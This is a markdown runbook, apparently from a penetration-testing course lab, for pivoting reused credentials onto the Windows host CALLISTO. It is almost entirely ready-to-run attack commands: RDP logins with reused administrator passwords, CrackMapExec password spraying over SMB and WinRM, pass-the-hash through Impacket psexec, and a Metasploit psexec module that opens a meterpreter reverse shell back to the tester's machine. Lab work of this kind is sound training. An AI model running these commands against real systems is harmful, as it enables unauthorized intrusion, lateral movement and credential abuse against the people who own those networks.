# Credential pivot — `10.20.160.101` (CALLISTO)

**Secrets:** only in [`../credentials_handoff_SECRETS.md`](../credentials_handoff_SECRETS.md) (gitignored). Use placeholders here; paste real values in your shell.

**Prep (exports, hygiene):** [Credential pivot hub](../credential_pivot_A_Rocha_hosts.md).

---

## Confirm ports (adjust if your nmap already has this)

```bash
export H101=10.20.160.101
nmap -Pn -p22,135,139,445,3389,3306,5985 -sV "$H101" -oA ~/scans/nmap_101_pivot
```

## RDP (GANYMEDE password reuse)

Replace **`<GANYMEDE_ADMIN_CLEAR>`** with the **GANYMEDE `administrator` cleartext** from the secrets handoff.

```bash
xfreerdp /v:"$H101" /u:Administrator /p:'<GANYMEDE_ADMIN_CLEAR>' /cert:ignore /dynamic-resolution
```

If that fails, try **`JUPITER\Administrator`** (same password):

```bash
xfreerdp /v:"$H101" /u:'JUPITER\Administrator' /p:'<GANYMEDE_ADMIN_CLEAR>' /cert:ignore /dynamic-resolution
```

**`CALLISTO\Alice` (from RDP UI — [`101-018`](./Screenshots/101-018_rdp_login_callisto_alice_logged_on_tm6_afrocha.png)):** The login tile discloses a **local user** on **CALLISTO**. You may try **`xfreerdp`** with **`/u:Alice`** or **`/u:'CALLISTO\Alice'`** when you have a **password you are allowed to test** (team sheet, reused cleartext from **`.htpasswd`**, etc.). Large public wordlists are **only** appropriate if the **course explicitly allows** them on this host; use throttling and **account-lockout** awareness, and keep spray logs out of git.

## SMB with CrackMapExec (same password)

```bash
crackmapexec smb "$H101" -u Administrator -p '<GANYMEDE_ADMIN_CLEAR>'
crackmapexec smb "$H101" -u 'JUPITER\Administrator' -p '<GANYMEDE_ADMIN_CLEAR>'
```

If you see **`(Pwn3d!)`** or **signed-in SMB`**, follow with **shares** / **lsa** only if **ROE** allows.

## Spray METIS / THEBE `DefaultPassword` strings

Copy the **two `DefaultPassword` plaintexts** from **`credentials_handoff_SECRETS.md`** (METIS row, THEBE row). Spray **SMB** first (faster than RDP):

```bash
crackmapexec smb "$H101" -u Administrator -p '<METIS_DEFAULTPASSWORD>'
crackmapexec smb "$H101" -u administrator -p '<METIS_DEFAULTPASSWORD>'
crackmapexec smb "$H101" -u Administrator -p '<THEBE_DEFAULTPASSWORD>'
crackmapexec smb "$H101" -u administrator -p '<THEBE_DEFAULTPASSWORD>'
```

Then repeat winners (if any) with **`xfreerdp`** as in **RDP** above.

## Pass-the-hash (METIS or THEBE `Administrator` NTLM)

Use **only** if the course allows **PTH**. The handoff lists **32-character hex** NTLM for **METIS** and **THEBE** `Administrator` (empty password accounts may still have a hash).

**Impacket** (example — replace **`<NTLM_HASH>`** with **METIS** or **THEBE** hash, **no** `:` prefix):

```bash
psexec.py -hashes :<NTLM_HASH> 'JUPITER/Administrator@'"$H101"
psexec.py -hashes :<NTLM_HASH> 'Administrator@'"$H101"
```

**Metasploit** (shape only — set **RHOSTS**, **SMBUser**, **SMBPass** as **`aad3b435b51404eeaad3b435b51404ee:<NTLM>`** for full LM:NT if required by module version):

```text
use exploit/windows/smb/psexec
set RHOSTS 10.20.160.101
set SMBUser Administrator
set SMBPass aad3b435b51404eeaad3b435b51404ee:<NTLM_HASH>
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <KALI_LAB_IP>
run
```

## MySQL (after cleartext wins elsewhere)

```bash
mysql --protocol=TCP -h "$H101" -P 3306 -u root -p
```

If you still see **`ERROR 1042`**, the server is doing **reverse DNS** on clients — pivot via **phpMyAdmin** on **80** in a browser, or **MySQL from a shell on the host** after RDP.

## WinRM (if `5985` was open in port scan)

```bash
crackmapexec winrm "$H101" -u Administrator -p '<GANYMEDE_ADMIN_CLEAR>'
evil-winrm -i "$H101" -u Administrator -p '<GANYMEDE_ADMIN_CLEAR>'
```
